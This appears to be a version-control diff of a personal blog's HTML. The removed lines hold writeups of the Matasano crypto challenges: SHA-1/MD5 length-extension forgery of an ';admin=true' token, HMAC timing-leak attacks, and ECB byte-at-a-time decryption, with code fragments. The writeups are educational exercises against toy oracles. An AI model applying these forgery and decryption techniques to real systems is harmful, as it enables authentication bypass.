-<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">message += <span class="string">b'\x00'</span> * ((<span class="number">56</span> - (message_byte_length + <span class="number">1</span>) % <span class="number">64</span>) % <span class="number">64</span>)</div></pre></td></tr></table></figure></li>
-</ol>
-<p>If the message is already &gt;56,</p>
-<ol start="3">
-<li>Append the 2-word representation of len(message).
-If the message is 40 bytes long,  The two-word representation of 40 is hex <code>00000000 00000028.</code></li>
-</ol>
-<p>There are five internal state variables, h0, h1, h2, h3, h4. These are concatenated to give the final digest.</p>
-<p>The h's are initialized to
-<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="number">0x67452301</span>,</div><div class="line"><span class="number">0xEFCDAB89</span>,</div><div class="line"><span class="number">0x98BADCFE</span>,</div><div class="line"><span class="number">0x10325476</span>,</div><div class="line"><span class="number">0xC3D2E1F0</span>,</div></pre></td></tr></table></figure></p>
-<p>Then, each chunk is processed and the h's are updated as follows:</p>
-<ol>
-<li>Split the 64-byte chunk into 16 4-byte words</li>
-<li>Populate a word_array of size 80 with the 16 words, and then 64 more generated values.</li>
-<li>Let <code>A = H0, B = H1, C = H2, D = H3, E = H4</code>.</li>
-<li>Do 80 rounds of transformations on a, b, c, d, e.</li>
-<li>Finally, update the internal digests
-<code>H0 = H0 + A, H1 = H1 + B, H2 = H2 + C, H3 = H3 + D, H4 = H4 + E</code>.</li>
-</ol>
-<p>So, when <code>update()</code> is called in <code>authsha1</code>, the internal states (the h's) are updated for every full 64-byte block, leaving the leftovers in <code>self._unprocessed</code>. Then, <code>digest()</code> is called, to pad the leftovers to 64 or 128 bytes, and do the last 1 or 2 internal state updates, returning the concatenated h's as the digest.</p>
-<h3>The attack</h3>
-<p>The attack will mean I am able to successfully append some data to the message and create a forged digest, such that the receiver will think that I generated the digest by knowing the key and accept the message as untampered.</p>
-<p>The steps for forging a digest are:</p>
-<p>I need to guess the length of the key so that my message will have the correct padding.</p>
-<ol>
-<li>
-<p>Split the SHA1 digest of the true message into 5 pieces, which will be passed as <code>h0, h1, h2, h3, h4</code> to a new SHA1.</p>
-</li>
-<li>
-<p>For each guess for the keylength, prepend key padding to the original message and append SHA1 padding.</p>
-</li>
-</ol>
-<p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">|keylen_guess|</div><div class="line">AAAAAAAAAAAAAA orig_message \x01\x00\x00...</div></pre></td></tr></table></figure></p>
-<ol start="3">
-<li>Pass in the internal state variables and the length of the padded message to a new SHA1, telling the algorithm how many bytes have been processed so far(<code>message_byte_length</code>) and the current state. Update the SHA1 with the extension data, getting a forged digest.</li>
-</ol>
-<p>We're essentially forging the digest for:
-<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">|keylen_guess|</div><div class="line">AAAAAAAAAAAAAA orig_message \x01\x00\x00... ;admin=true</div></pre></td></tr></table></figure></p>
-<ol start="3">
-<li>Now, remove the key padding from the extended message, leaving the forged message:
-<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">orig_message \x01\x00\x00... ;admin=true</div></pre></td></tr></table></figure></li>
-</ol>
-<p>. Send this and its forged digest to the receiver to be verified. The receiver will prepend the key to this message and calculate the digest. When we guess the correct keylen, the padding we've added to the orig_message block will be correct, and the SHA1 will continue by hashing the next block, <code>;admin=true</code>, and find that the digest is the same as our forged one.</p>
-<p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">padded_plaintext_no_key = padded_plaintext_with_key_extension[keylen_guess:]</div><div class="line"></div><div class="line"><span class="keyword">if</span> validate_oracle(key, padded_plaintext_no_key, forged_digest):</div><div class="line">  <span class="keyword">print</span> <span class="string">"Found keylen_guess"</span>, keylen_guess</div></pre></td></tr></table></figure></p>
-<p>I successfully created a forged digest for the message <code>comment1=cooking%20MCs;userdata=foo;comment2=%20like%20a%20pound%20of%20bacon\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x98;admin=true</code> that the receiver validates!</p>
-<h2>Challenge 30 Break an <s>MD4</s> MD5 keyed MAC using length extension</h2>
-<p>I decided I like MD5 better than MD4, and there's more implementations out there.</p>
-<p>MD5 is susceptible to the same length extension attack as above because it follows the MD construction, which includes padding and the fact that the output of the hash gives all the state needed to continue, or extend, the hash.</p>
-<p>Here's how MD5 works:</p>
-<p>The padding scheme is very similar to SHA-1 — the only difference being that the length is added on as big-endian packed instead of little-endian packed.</p>
-<p>There are four internal state variables - A, B, C, D, each 32 bits. These are initialized to
-<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">word A: <span class="number">01</span> <span class="number">23</span> <span class="number">45</span> <span class="number">67</span></div><div class="line">word B: <span class="number">89</span> ab cd ef</div><div class="line">word C: fe dc ba <span class="number">98</span></div><div class="line">word D: <span class="number">76</span> <span class="number">54</span> <span class="number">32</span> <span class="number">10</span></div></pre></td></tr></table></figure></p>
-<p>We also use a table of 64 values generated from the <code>sine</code> function, <code>self.k</code>.</p>
-<ol>
-<li>
-<p>For each chunk, which is 512 bits, we unpack into 16 words of 32-bits.</p>
-</li>
-<li>
-<p>Then, we do 64 transforms, split into four rounds. each transform taking: an incrementing-by-one index into the <code>sin</code> table, a function <code>f</code> specific to the round, a <code>lrot</code> value, and an index into our array of 16 words.</p>
-</li>
-</ol>
-<p>At the end of each transform, the <code>ABCD</code> values are updated as follows:</p>
-<p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">a, b, c, d = d, x &amp; <span class="number">0xffffffff</span>, b, c</div></pre></td></tr></table></figure></p>
-<p>where <code>x</code> is the result of the transform.</p>
-<p>The message digest produced as output is the concat of A, B, C, D, 128 bits, or 16-bytes in length.</p>
-<p>I use the implementation at https://github.com/FiloSottile/crypto.py/blob/master/2/md5.py, but it needs to be extended in several ways for this challenge.</p>
-<p>The implementation must allow the caller to set the internal state variables so that I can continue the hash. I add
-<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">if</span> state_array:</div><div class="line">        self.A = state_array[<span class="number">0</span>]</div><div class="line">        self.B = state_array[<span class="number">1</span>]</div><div class="line">        self.C = state_array[<span class="number">2</span>]</div><div class="line">        self.D = state_array[<span class="number">3</span>]</div><div class="line">    <span class="keyword">else</span>:</div><div class="line">        <span class="comment">#initial magic</span></div><div class="line">        self.A, self.B, self.C, self.D = (<span class="number">0x67452301</span>, <span class="number">0xefcdab89</span>, <span class="number">0x98badcfe</span>, <span class="number">0x10325476</span>)</div></pre></td></tr></table></figure></p>
-<p>The implementation also must allow the caller to specify how many bytes have been processed so far, the <code>message_byte_length</code> option above.</p>
-<h2>Challenge 31 Implement and break HMAC-SHA1 with an artificial timing leak</h2>
-<p>I use Tornado as my web framework.</p>
-<p>I take in a <code>file</code> and <code>signature</code> URL param, and implement an <code>insecure_compare</code> function that converts the values to ascii, then byte-by-byte compares, adding a timing delay of 50ms.</p>
-<p>I iterate through all possible bytes, making a request with my known bytes + byte_guess + padding.</p>
-<p>I simply take the maximum delay each time, which would occur when I've guessed the byte correctly, causing another sleep of 50ms, for an added delay of 100ms.</p>
-<h2>Challenge 32 Break HMAC-SHA1 with a slightly less artificial timing leak</h2>
-<p>When I have such a small timing leak (5ms), network delays make the previous exploit unreliable. I need to normalize over multiple runs (I choose 10) to be able to tell whether the maximum is indeed the correct HMAC byte.</p>
-
+<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> xrange(len(ciphertext)):</div><div class="line">  <span class="keyword">for</span> c <span class="keyword">in</span> candidates:</div><div class="line">    new_ciphertext = edit(ciphertext, i, c)</div><div class="line"></div><div class="line">    <span class="keyword">if</span> new_ciphertext[i] == ciphertext[i]:</div><div class="line">      result += c</div></pre></td></tr></table></figure>
+        <!-- Challenge 25 Break &quot;random access read/write&quot; AES CTR
+Because we can seek into the ciphertext and edit arbitrary characters, we we can simply guess each plaintext character.
+For each byte......  -->
+        <p class="article-more-link">
+          <a href="/2017/03/07/set4-writeup/#more">Read More</a>
+        </p>
       
     </div>
     
@@ -496,7 +372,7 @@ If the message is 40 bytes long,  The two-word representation of 40 is hex <code
 
 
   
-    <article id="post-set1_writeup"
+    <article id="post-Flex-and-Bison-for-a-simple-language-MITScript"
    style="margin-top: 0px; margin-bottom: 0px; "
   
   class="article article-type-post" itemscope itemprop="blogPost" >
@@ -510,7 +386,7 @@ If the message is 40 bytes long,  The two-word representation of 40 is hex <code
         
   
     <h1 class="thumb" itemprop="name">
-      <a class="article-title" href="/2017/03/07/set1_writeup/">Matasano Crypto Challenges, Set 1</a>
+      <a class="article-title" href="/2017/03/07/Flex-and-Bison-for-a-simple-language-MITScript/">Flex and Bison for a Simple Language, MITScript</a>
     </h1>
   
 
@@ -518,196 +394,22 @@ If the message is 40 bytes long,  The two-word representation of 40 is hex <code
     
     <div class="article-meta">
       
-	<a href="/2017/03/07/set1_writeup/" class="article-date">
+	<a href="/2017/03/07/Flex-and-Bison-for-a-simple-language-MITScript/" class="article-date">
 	  <time datetime="2017-03-07T15:38:11.000Z" itemprop="datePublished">03-07-2017</time>
 	</a>
 
       
-    <a class="article-category-link" href="/categories/Crypto/">Crypto</a>
+    <a class="article-category-link" href="/categories/Languages/">Languages</a>
 
     </div>
     <div class="article-entry" itemprop="articleBody">
       
-        <h2>Challenge 1.1 Convert hex to base64</h2>
-<p>The first challenge is pretty straightforward, using python's built-in functions or <a href="https://github.com/Gallopsled/pwntools" target="_blank" rel="external">pwntools</a>, as I use heavily in these challenges.</p>
-<p>The functions <code>a2b_hex</code>, <code>unhexlify</code>, and <code>''.decode(&quot;hex&quot;)</code> all do the same thing. They take in an ascii string of the form &quot;[0-9a-f]*&quot; and decode it. The string decodes to
-<code>I'm killing your brain like a poisonous mushroom</code>. We can then use <code>binascii.b2a_base64()</code> to convert the byte string to a base64 representation.</p>
-<p>&lt;!-- more --&gt;</p>
-<h2>Challenge 1.2 Fixed XOR</h2>
-<p>This challenge uses iterators to do a fixed-length xor.</p>
-<p>The <code>chr()</code> function takes an ASCII integer code in the range 0-255 and returns a character string.</p>
-<p>The <code>ord()</code> function does the inverse, taking a character and returning its integer. We want to xor these integers.</p>
-<p>Thus, <code>''.join([chr(ord(i)^ord(j)) for i, j in zip(s1, s2)])</code> will first xor the integers of each character of the input strings with <code>ord()</code>. Then it will convert back into a character string with <code>chr()</code>.</p>
-<h2>Challenge 1.3 Single-byte XOR cipher</h2>
-<p>Extending the last challenge, we can create a variable-length input xor function. Or, we can use pwntools <code>xor()</code>.</p>
-<p>I iterate through all 255 possible single character xor keys, scoring each decrypted word based on character frequency.
-<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">for</span> c <span class="keyword">in</span> result:</div><div class="line">  c = c.lower()</div><div class="line">  <span class="keyword">if</span> c <span class="keyword">in</span> character_frequency:</div><div class="line">    word_score += character_frequency[c]</div><div class="line"></div><div class="line">cand_words.append((result, word_score, char))</div></pre></td></tr></table></figure></p>
-<h2>Challenge 1.4 Detect single-character XOR</h2>
-<p>This challenge asks us to find which of the 60-character strings in the file has been encrypted by single-character XOR.</p>
-<p>Using the <code>find_singlechar_key_xor</code> utility function created in the last challenge, I can iterate through all the file strings and find the possible single-character xor key and word score of each line.</p>
-<p>The line turns out to decode to 'Now that the party is jumping\n', xored against the byte 5.</p>
-<h2>Challenge 1.5 Implement repeating-key XOR</h2>
-<p>This is a cop-out. Pwntools implements repeating-key xor in its <code>utils.fiddling</code> library.</p>
-<p>We can use python <a href="https://docs.python.org/2/library/itertools.html" target="_blank" rel="external">itertools</a> for this as well,
-<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">return</span> <span class="string">''</span>.join([chr(ord(i)^ord(j)) <span class="keyword">for</span> i, j <span class="keyword">in</span> it.izip(s1, it.cycle(s2))])</div></pre></td></tr></table></figure></p>
-<h2>Challenge 1.6 Break repeating-key XOR</h2>
-<p>This challenge asks us to solve repeating-key xor, aka the Vigenere cipher.</p>
-<p>There are several steps to doing this.</p>
-<ol>
-<li>First, we need to find the xor key length. the period of the cipher.</li>
-<li>Next, we need to find the key character-by-character, using the single-byte xor cipher we made in Challenge 1.3.</li>
-</ol>
-<p>In the first step I calculate the Hamming distance (number of diff bits between two strings) of two consecutive ciphertext blocks (of some guessed length). The correct keylength will create blocks of minimum Hamming distance.</p>
-<p>The challenge tells us to try values from 2 to 40 for the guessed key length. I calculate the hamming distance of all combinations of 4 blocks.
-<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">pairs = list(it.combinations(blocks, <span class="number">2</span>))</div><div class="line">hamsum = it.starmap(hamming, pairs)</div></pre></td></tr></table></figure></p>
-<p><code>it.starmap</code> computes the <code>hamming</code> function using arguments obtained from the iterable <code>pairs</code>.
-I then normalize the Hamming distance for keysize.
-<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">normalized = float(reduce(<span class="keyword">lambda</span> x, y: x+y, hamsum))/keysize</div></pre></td></tr></table></figure></p>
-<p>and find the keylength with the minimum normalized hamming distance is 29.</p>
-<p>The second step is to find the key, character-by-character. I split the ciphertext into blocks of len(keysize) and transpose them, so that I have a list of all the 1st, 2nd, etc... chars of each block. Each of these transposed messages has been single-char xored, so I can just find each single-char key and concatenate the chars to get the full xor key.</p>
-<p><img src="/images/vigenere.png" alt="Vigenere cipher"></p>
-<p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">blocks = [x[i:i+keysize] <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, len(x), keysize)]</div><div class="line"></div><div class="line">blocks = it.izip_longest(*blocks, fillvalue=<span class="string">'0'</span>)</div><div class="line"></div><div class="line">block_list = [<span class="string">''</span>.join(msg) <span class="keyword">for</span> msg <span class="keyword">in</span> blocks]</div><div class="line"></div><div class="line">char_freqs = [find_singlechar_key_xor(<span class="string">''</span>.join(msg))[<span class="number">2</span>]</div><div class="line"><span class="keyword">for</span> msg <span class="keyword">in</span> block_list]</div></pre></td></tr></table></figure></p>
-<p>I need to use <code>izip_longest</code> because the last block is shorter than the others, and <code>izip_longest</code> pads the shortest elements of the iterable.</p>
-<p>The key made by joining the single-char keys is <code>Terminator X: Bring the noise</code>.</p>
-<h2>Challenge 1.7 AES in ECB mode</h2>
-<p>This challenge introduces the AES block cipher and the ECB mode. The ECB mode is problematic because it is stateless and deterministic — the same block of plaintext will encrypt to the same ciphertext.</p>
-<p>I use the <a href="https://cryptography.io" target="_blank" rel="external"><code>cryptography</code></a> module in Python because it's being actively developed, although the PyCrypto library is more popular.</p>
-<p>You initialize AES, a symmetric cipher, with
-<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">cipher = Cipher(algorithm = algorithms.AES(<span class="string">"YELLOW SUBMARINE"</span>), mode = modes.ECB(), backend=default_backend())</div></pre></td></tr></table></figure></p>
-<p>.</p>
-<p>To decrypt text, you use a <code>decryptor</code> object and the update() and finalize() methods.</p>
-<p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">d = cipher.decryptor()</div><div class="line">decrypted_text = d.update(file) + d.finalize()</div></pre></td></tr></table></figure></p>
-<h2>Challenge 1.8 Detect AES in ECB mode</h2>
-<p>Because ECB is deterministic, I can detect which of the strings in 8.txt is encrypted using ECB. The properties of the plaintext, such as low Hamming distance, will remain in the ciphertext. Thus, I can use minimum Hamming distance to find the correct line, similar to Challenge 6.</p>
-<p>I create a scoring function, <code>hamming_score_line(line)</code>, which will return the hamsum of a line of ciphertext.</p>
-<p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">min_line_num = min(lines, key=hamming_score_line)[<span class="number">0</span>]</div></pre></td></tr></table></figure></p>
-<p>will be the correct answer, 133.</p>
-<h2>References</h2>
-<p>[1] <a href="https://github.com/Gallopsled/pwntools" target="_blank" rel="external">pwntools</a></p>
-
-      
-    </div>
-    
-      <footer style="border-top:1px solid rgba(208,211,248,0.25)">
-      </footer>
-    
-  </div>
-  
-</article>
-
-
-<!-- Table of Contents -->
-
-
-  
-    <article id="post-set2_writeup"
-   style="margin-top: 0px; margin-bottom: 0px; "
-  
-  class="article article-type-post" itemscope itemprop="blogPost" >
-  <!-- Back button -->
-  
-
-  <div id="articleInner" class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 class="thumb" itemprop="name">
-      <a class="article-title" href="/2017/03/07/set2_writeup/">Matasano Crypto Challenges, Set 2</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="article-meta">
-      
-	<a href="/2017/03/07/set2_writeup/" class="article-date">
-	  <time datetime="2017-03-07T15:38:11.000Z" itemprop="datePublished">03-07-2017</time>
-	</a>
-
-      
-    <a class="article-category-link" href="/categories/Crypto/">Crypto</a>
-
-    </div>
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h2>Challenge 9 Implement PKCS#7 padding</h2>
-<p>As the challenge states, &quot;A block cipher transforms a fixed-sized block (usually 8 or 16 bytes) of plaintext into ciphertext. But we almost never want to transform a single block; we encrypt irregularly-sized messages.&quot;</p>
-<p>The PKCS#7 padding scheme will append the number of bytes of padding to the end of the block. I use the pwntools <code>pack()</code> function to pack the number of padding bytes.</p>
-<p>&lt;!-- more --&gt;</p>
-<h2>Challenge 10 Implement CBC mode</h2>
-<p>This challenge has us implement CBC mode of block encryption.</p>
-<p>In CBC mode, each block of plaintext is XORed with the previous ciphertext block before being encrypted. We need an IV for the first block of plaintext.</p>
-<p><img src="https://upload.wikimedia.org/wikipedia/commons/d/d3/Cbc_encryption.png" alt="CBC Encryption"></p>
-<p><img src="https://upload.wikimedia.org/wikipedia/commons/6/66/Cbc_decryption.png" alt="CBC Decryption"></p>
-<p>In <code>set2_utils</code>, I create a CBC Cipher class that takes in a cipher and an IV. The <code>encrypt()</code> function will split the plaintext into blocks (usually size 16), and then do the encryption:</p>
-<p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># Xor with previous block. First prev_xor_block is the IV.</span></div><div class="line">pre_aes_block = xor(blocks[i], prev_xor_block)</div><div class="line"></div><div class="line"><span class="comment"># Encrypt with cipher algorithm</span></div><div class="line">current_cipher_block = e.update(pre_aes_block)</div><div class="line">prev_xor_block = current_cipher_block</div><div class="line">ciphertext += current_cipher_block</div></pre></td></tr></table></figure></p>
-<p>The decryption takes each block of ciphertext, decrypts it, and XORs with the previous block of ciphertext to recover the plaintext.</p>
-<p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">1</span>, len(blocks)):</div><div class="line">  decrypted_block = d.update(blocks[i])</div><div class="line">  <span class="comment"># print decrypted_block</span></div><div class="line"></div><div class="line">  plaintext += xor(decrypted_block, blocks[i<span class="number">-1</span>]) <span class="comment"># where blocks[i-1] is the previous ciphertext block</span></div></pre></td></tr></table></figure></p>
-<p>I can verify I've done this correctly by decrypting 10.txt with a CBC Cipher with IV <code>'\x00'*16</code>.</p>
-<h2>Challenge 11 An ECB/CBC detection oracle</h2>
-<p>This challenge asks us to detect whether we've encrypted a text with ECB or CBC, chosen at random.</p>
-<p>Recall the properties of ECB vs CBC — ECB will take two identical plaintext blocks and produce two identical ciphertext blocks.</p>
-<p>This is as simple as asking the oracle to encrypt a string that contains at least two consecutive blocks of identical characters. If the oracle chooses ECB, the ciphertext will have two adjacent identical blocks as well.</p>
-<p>To ensure that we have at least two consecutive blocks of identical characters, we need to input at least 43 bytes. Why? Because the oracle pads the plaintext with 5-10 bytes, so we need to give some offset to ensure our identical plaintext blocks are properly aligned.</p>
-<p>R = random_nfix
-<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">|-------<span class="number">-16</span>-----|</div><div class="line">|<span class="number">-5</span>-| |--<span class="number">-11</span>----| |-------<span class="number">-16</span>----| |-------<span class="number">-16</span>----|</div><div class="line">RRRRR <span class="number">00000000000</span> <span class="number">0000000000000000</span> <span class="number">0000000000000000</span></div></pre></td></tr></table></figure></p>
-<h2>Challenge 12 Byte-at-a-time ECB decryption (Simple)</h2>
-<p>I have an oracle that produces <code>AES-128-ECB(your-string || unknown-string, random-key)</code>.</p>
-<p>I can find unknown-string with this oracle. The idea is that,</p>
-<ol>
-<li>First, I need to find the block size of the cipher.</li>
-<li>Then, assuming I know it's using ECB, I can find the flag byte-by-byte. How? Since I control my-string, I can ensure each time that the oracle encrypts 15 bytes that I know + one unknown byte. I can then create a table of all possible ciphertexts of the 15 known bytes + 1 unknown byte, and compare the ciphertext the oracle returns to the ciphertexts in my table.</li>
-</ol>
-<p>To find the block size, I feed in incrementing offsets to the oracle, until the ciphertext length increases. The size of the increase will be block_size, because of the padding.</p>
-<p>Next, I need to get an offset of 15 known bytes to feed into the oracle. The first offset is just 15 filler variables, all A's.</p>
-<p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">U = unknown flag byte</div><div class="line">K = known flag byte</div><div class="line"></div><div class="line">Input to oracle, |<span class="number">-16</span>-| bytes to be looked up <span class="keyword">in</span> table:</div><div class="line"></div><div class="line">          |----offset----|</div><div class="line">          |-------<span class="number">-16</span>-----|</div><div class="line">plaintext: AAAAAAAAAAAAAAAU UUUU.....</div></pre></td></tr></table></figure></p>
-<p>And I create a table of all possible ciphertexts of A...U.</p>
-<p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">for</span> cand <span class="keyword">in</span> candidates:</div><div class="line">		<span class="comment"># every candidate block of ciphertext is 16 bytes</span></div><div class="line">		block_of_interest = oracle(offset+cand)[<span class="number">0</span>:blocksize]</div><div class="line">		cand_dict[block_of_interest] = cand</div></pre></td></tr></table></figure></p>
-<p>I then feed the block with the unknown byte to the oracle, padding with the same filler variables as my offset. Perform the table lookup.</p>
-<p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">oracle_block = oracle(<span class="string">'A'</span>*offset_len)[block_of_interest : block_of_interest + blocksize]</div><div class="line"></div><div class="line"></div><div class="line"><span class="keyword">if</span> oracle_block <span class="keyword">in</span> cand_dict:</div><div class="line">  next_byte = cand_dict[oracle_block]</div></pre></td></tr></table></figure></p>
-<p>At the next iteration, I decrease the number of filler variables by 1, since I have a known byte and want the next byte.</p>
-<p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">Input to oracle, |<span class="number">-16</span>-| bytes to be looked up <span class="keyword">in</span> table:</div><div class="line">          |-------<span class="number">-16</span>-----|</div><div class="line">plaintext: AAAAAAAAAAAAAAKU UUUU.....</div></pre></td></tr></table></figure></p>
-<p>When I have 16 known bytes in this manner, I no longer need filler variables in my offset; I can just use the previous 15 known bytes as my offset. Note that my lookup table can be populated with ciphertexts of 16 flag bytes.</p>
-<p>Since I have 16-byte ciphertexts in my lookup table, I need to first align, then get the index of, the 16-byte block-of-interest that I'll look up in my table.</p>
-<p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">Input to oracle, |<span class="number">-16</span>-| bytes to be looked up <span class="keyword">in</span> table:</div><div class="line"></div><div class="line">block_num:          <span class="number">0</span>               <span class="number">1</span></div><div class="line">                              block_of_interest</div><div class="line">            alignment bytes  |-------<span class="number">-16</span>-----|</div><div class="line">plaintext: AAAAAAAAAAAAAAAK  KKKKKKKKKKKKKKKU UUUU.....</div></pre></td></tr></table></figure></p>
-<p>Stopping after I run out of bytes, I find the answer is<br>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">Rollin<span class="string">' in my 5.0\nWith my rag-top down so my hair can blow\nThe girlies on standby waving just to say hi\nDid you stop? No, I just drove by\n</span></div></pre></td></tr></table></figure></p>
-<h2>Challenge 13  ECB cut-and-paste</h2>
-<h2>Challenge 14  Byte-at-a-time ECB decryption with random prefix</h2>
-<p>In this challenge, a random-length prefix is added to the attacker-controlled string, <code>AES-128-ECB(random-prefix || attacker-controlled || target-bytes, random-key)</code>. Thus, I need to know the length of the prefix to be able to conduct the same attack as Challenge 12.</p>
-<p>Finding this length is not so hard.</p>
-<ol>
-<li>First, I can find the block index of the last byte of the prefix with just two calls to the oracle.</li>
-<li>Then, I find the offset of the last byte of the prefix within the last block.</li>
-</ol>
-<p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">ciphertext1 = prefix_oracle(<span class="string">''</span>)</div><div class="line">ciphertext2 = prefix_oracle(<span class="string">'A'</span>)</div></pre></td></tr></table></figure></p>
-<p>Because this is ECB mode, the first different block between <code>ciphertext1</code> and <code>ciphertext2</code> will be the last block of the prefix.</p>
-<p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">U = unknown flag byte</div><div class="line">R = random prefix byte</div><div class="line"></div><div class="line">plaintext1:</div><div class="line">|-------<span class="number">-16</span>----||-enc to different value-|</div><div class="line">RRRRRRRRRRRRRRRRRRRRUUUUUU....</div><div class="line"></div><div class="line">plaintext2:</div><div class="line">|-------<span class="number">-16</span>----||-enc to different value-|</div><div class="line">RRRRRRRRRRRRRRRRRRRRAUUUUUU....</div></pre></td></tr></table></figure></p>
-<p>Now that I know what block the last byte of the prefix is in, <code>find_prefix_block_modulo_offset</code> finds the offset of the last byte of the prefix. I want to align two blocks of identical plaintext, to encrypt to two blocks of identical ciphertext. The amount of offset I use to align will tell me the offset of the prefix.</p>
-<p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">0</span>, blocksize):</div><div class="line">  offset = <span class="string">'A'</span>*i + <span class="string">'\x00'</span>*<span class="number">32</span></div><div class="line">  ciphertext = prefix_oracle(offset)</div></pre></td></tr></table></figure></p>
-<p><figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">     |--offset-|</div><div class="line">RRRRR00000000000 0000000000000000 0000000000000000 UUUUUU....</div><div class="line"></div><div class="line">```python</div><div class="line">In the above example, the two 16-byte-aligned blocks of \x00's will encrypt to adjacent identical ciphertext, which I can detect.</div><div class="line"></div><div class="line">Finally, `find_next_byte_with_prefix` will do the work. The offset is now</div><div class="line">```python</div><div class="line">offset = 'A'*(extra_offset_for_prefix + offset_len)</div></pre></td></tr></table></figure></p>
-<p>, with offset_len always being 15 known bytes, as in Challenge 12.</p>
-<p>The keys in my lookup table are no longer a fixed-length of blocksize — they include all known bytes now. Here, the len(offset) is <strong>not always 15</strong>, as in Challenge 12. Also, the length of my lookup table keys is <strong>not always blocksize</strong>; rather, the length of my keys increases with the number of known bytes. I could have implemented this more similarly to Challenge 12, which would have been less computationally expensive.</p>
-<p>How do I produce ciphertext keys for my lookup table now? Here's what I feed into the oracle:
